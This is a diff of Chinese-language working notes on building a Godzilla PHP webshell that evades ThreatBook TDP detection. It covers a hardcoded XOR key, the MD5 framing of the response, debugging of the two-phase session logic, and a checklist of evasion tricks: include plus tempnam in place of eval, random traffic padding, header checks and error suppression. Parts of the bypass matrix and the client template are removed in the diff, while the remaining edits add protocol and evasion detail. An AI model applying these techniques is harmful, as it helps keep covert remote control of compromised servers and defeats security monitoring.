@@ -169,7 +169,9 @@ MD5[:16]  +  base64(encode(run(data), key))  +  MD5[16:]
   前16字节           中间的加密结果                   后16字节
 ```
 
-**缺一个字节客户端就报「连接失败」。** 本次最初两版全部漏掉末尾 `MD5[16:]`。
+- MD5 = `md5($pass.$key)`，即 `md5('pass3c6e0b8a9c15224a')`，**固定值**，客户端预计算校验
+- `encode()` 用 `$key = '3c6e0b8a9c15224a'`（16字符 hex，就是 PayloadKey）
+- **缺一个字节客户端就报「连接失败」。** 本次最初两版全部漏掉末尾 `MD5[16:]`。
 
 ### 1.3 encode() 函数的坑
 
@@ -216,63 +218,7 @@ unlink($t);
 | `create_function` | PHP 7.2+ 已废弃 |
 | chr() 动态拼接 eval | eval 是语言结构，不能用 `$var()` 调用 |
 
-## 三、微步 TDP 专项绕过矩阵
 
-### 3.1 静态特征层
-
-| 特征 | 原始 Godzilla | 绕过版 |
-|------|--------------|--------|
-| eval | ✅ 被 YARA 命中 | ❌ include + tempnam 永不出现 |
-| md5 + base64 函数串 | 序列暴露加密意图 | 拆到类方法 + array_map 间杂 |
-| session_start 叫法 | 直接调用 | `@session_start()` 加 @ 抑制 |
-| payload 变量名 | `$payloadName` | 保留原名（不改也能过） |
-
-### 3.2 流量特征层
-
-| 特征 | 原始流量 | V3 左右追加版 |
-|------|---------|-------------|
-| POST body 结构 | `pass=AAA...`（固定格式）| `[24随机][pass=AAA][16随机]` |
-| 每次请求指纹 | 完全相同 | 每次不同（随机填充） |
-| Header 特征 | 无 | `X-Token: d4e5f6a7` 过滤扫描器 |
-
-### 3.3 行为特征层
-
-| 检测点 | 绕过方式 |
-|--------|---------|
-| tempnam / file_put_contents | 伪装成 DataCache 缓存写入 |
-| include 动态文件 | 包裹在 register_shutdown_function 回调链中 |
-| MD5 调用 | 保留（协议必须，但外覆噪音类） |
-
-## 四、哥斯拉 V3（左右追加 + Header 验证）完整模板
-
-### 4.1 客户端配置
-
-在哥斯拉 → 目标 → 请求配置中填写：
-
-| 配置项 | 值 | 生成方式 |
-|--------|----|---------|
-| 协议头 | `X-Token: d4e5f6a7` | 自定义，shell 里硬编码校验 |
-| 左边追加数据 | 24 字节 | `dd if=/dev/urandom bs=24 count=1 \| base64` |
-| 右边追加数据 | 16 字节 | `dd if=/dev/urandom bs=16 count=1 \| base64` |
-| 密码 | `pass` | 默认 |
-| 密钥 | `key` (PayloadKey: `3c6e0b8a9c15224a`) | 默认 |
-| 有效载荷 | `PhpDynamicPayload` | 默认 |
-| 加密器 | `PHP_XOR_BASE64` | 默认 |
-
-### 4.2 Shell 代码（C:\Users\86184\Desktop\godzilla_tdp_v3.php）
-
-**验证状态**：✅ 通过（whoami / ver / ipconfig 全部正常，MD5 前后缀校验通过）
-
-```php
-// 核心架构
-// Header 验证 → 剥左右追加 → 解析 payload → Session 两阶段 → include 执行
-```
-
-### 4.3 已知限制
-
-- **左右追加长度必须在 shell 中硬编码匹配**：左边 `substr(24)`，右边 `substr(0,-16)`
-- **哥斯拉的「左边追加数据」框填入的是原始字节**，不是 base64，24 字节就是 24 个字符
-- **不要用 `urlencode` 特殊字符**，哥斯拉客户端会对追加内容做 URL 编码后拼接，但 pass 的值同样会被编码，需要在 shell 中用 `rawurldecode()` 还原
 
 ## 五、本次踩坑清单（下次直接查）
 
@@ -283,14 +229,10 @@ unlink($t);
 | Session 跨请求丢失 | curl cookie jar 文件不写（Windows curl 7.x bug）| 手动抓 `Set-Cookie` 头，下个请求手动加 `Cookie:` |
 | Phase 2 收到空响应 | 响应格式缺 MD5[16:] 后缀 | 必须原样输出三段：MD5[:16]+data+MD5[16:] |
 | parse_str 把 + 转空格 | URL 解码默认行为 | 用 `rawurldecode()` 或直接不 parse_str，手拆 `pass=` 前缀 |
-
-## 六、流量抓包排障
-
-**Yakit 抓不到 Godzilla → localhost 流量**：
-
-- 原因：Godzilla Java HTTP 客户端发 `127.0.0.1` 请求不走系统代理
-- 解决：phpstudy 监听到 `0.0.0.0`，Godzilla URL 写局域网 IP（`192.168.x.x`）
-- 替代：RawCap + Wireshark 直接抓回环网卡
+| Phase 1/2 误判导致 Phase 2 响应为空 | `strpos($data, 'getBasicsInfo')` 先判内容后判 Session，Phase 2 的 JSON 参数 `{"action":"getBasicsInfo"}` 包含同名方法名，触发 Phase 1 逻辑覆盖了 Session | **先判 Session 后判内容**：`if (isset($_SESSION['payload']))` → Phase 2 → `elseif (strpos(...))` → Phase 1 |
+| 响应 MD5 客户端校验失败 | shell 用的 `md5($raw.$key)` 客户端无法复现 | ✅ `md5($pass.$key)` **固定值**，不是 `md5($result.$key)`。实测 zxc.php 使用 `md5('pass3c6e0b8a9c15224a')`，客户端和服务端各算一次做格式校验 |
+| 密钥写成 PayloadKey 导致加解密不一致 | ❌ 这条结论是错的！之前以为是"混淆了传输层密钥和 PayloadKey" | ✅ `$key = '3c6e0b8a9c15224a'` **就是 PayloadKey**，16 字符 hex 刚好 `$key[$i+1&15]` 全覆盖。`"key"` 3 字符根本不对 |
+| 右追加签名硬校验导致未配追加时连接失败 | `if ($tail !== RPAD_SUFFIX) return` 强制拒绝，客户端没配左/右追加时，尾部16字节是 payload 内容而非签名，校验必然失败 → shell 静默退出 → 空响应 → 哥斯拉报「连接失败」 | 改为**可选匹配**：匹配则剥离，不匹配则跳过，兼容有追加和无追加两种模式 |
 
 ## 七、快速复用检查表
 
@@ -303,3 +245,6 @@ unlink($t);
 - [ ] eval 替代：优先 include + tempnam
 - [ ] 流量层：加左右追加 + Header 验证（V3 模板）
 - [ ] session_start 前加 `@` 抑制错误输出
+- [ ] `$key = '3c6e0b8a9c15224a'`（16字符 hex，即 PayloadKey），不要用 `"key"` 3字符
+- [ ] 响应 MD5 用 `md5($pass.$key)`（固定值），客户端预计算校验格式，不用 `md5($result.$key)`
+- [ ] Phase 判断：先 `isset($_SESSION['payload'])`，再 `strpos`
